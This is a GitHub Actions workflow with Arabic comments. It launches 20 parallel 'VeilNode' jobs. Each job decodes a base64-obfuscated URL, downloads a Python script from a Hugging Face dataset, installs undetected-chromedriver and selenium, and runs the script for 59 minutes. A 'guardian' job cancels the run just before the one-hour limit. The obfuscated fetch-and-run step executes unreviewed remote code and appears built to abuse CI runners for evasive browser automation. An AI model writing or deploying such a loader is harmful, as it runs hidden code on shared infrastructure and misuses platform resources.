name: Obsidian Veil Dispatch Network

on:
  workflow_dispatch:

concurrency:
  group: obsidian-veil-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # الحارس الفولاذي: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
  # =================================================================
  steel-guardian:
    name: "Steel Guardian"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: Install Guardian Beacon
        run: |
          echo "[GUARDIAN] Steel guardian deployed. Beacon installed at the 59-minute boundary."
          echo "[GUARDIAN] Run cipher logged: ${{ github.run_id }}"
          
          # فترة الحراسة المحددة (3540 ثانية = 59 دقيقة)
          sleep 3540
          
          echo "[GUARDIAN] Boundary pierced! Firing guardian beacon..."
          
          # إطلاق أمر الإلغاء عبر GitHub API
          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
          
          echo "[GUARDIAN] Beacon fired. Every running and waiting veil will be dissolved."

  # =================================================================
  # شبكة الحجب المتوازية: تكوين وتشغيل عُقد الحجب
  # =================================================================
  veil-network:
    name: "VeilNode-${{ matrix.veil_token }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        veil_token: [1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120]

    steps:
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الدرجة ⟨1⟩: تمهيد الأرض
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Level Ground
        run: |
          echo "[LEVEL] Leveling ground for VeilNode-${{ matrix.veil_token }} on Linux..."
          sudo apt update -qq
          sudo apt install -y curl python3-pip

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الدرجة ⟨2⟩: انتزاع العتاد التنفيذي
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Seize Runtime Gear
        run: |
          echo "[SEIZE] Seizing veil_runtime.py from assigned beacon route..."
          BEACON_ROUTE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
          curl -sL "$BEACON_ROUTE" -o veil_runtime.py
          echo "[SEIZE] Runtime gear seized."

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الدرجة ⟨3⟩: تأمين الملحقات
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Secure Add-ons
        run: |
          echo "[SECURE] Securing add-ons..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الدرجة ⟨4⟩: التنفيذ المقيّد بـ 59 دقيقة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Emit Veil Impulse
        run: |
          echo ">> Emitting VeilNode-${{ matrix.veil_token }} impulse..."
          
          # تشغيل العملية في الخلفية
          python3 veil_runtime.py &
          VEIL_PID=$!
          
          echo ">> Veil impulse emitted. Limit: 59 minutes (3540s)."
          
          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
          sleep 3540
          
          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
          if kill -0 $VEIL_PID 2>/dev/null; then
            echo ">> Limit reached! Dispersing impulse..."
            kill -9 $VEIL_PID
            echo ">> Impulse dispersed by limit sentinel."
          else
            echo ">> Impulse settled within limit."
          fi
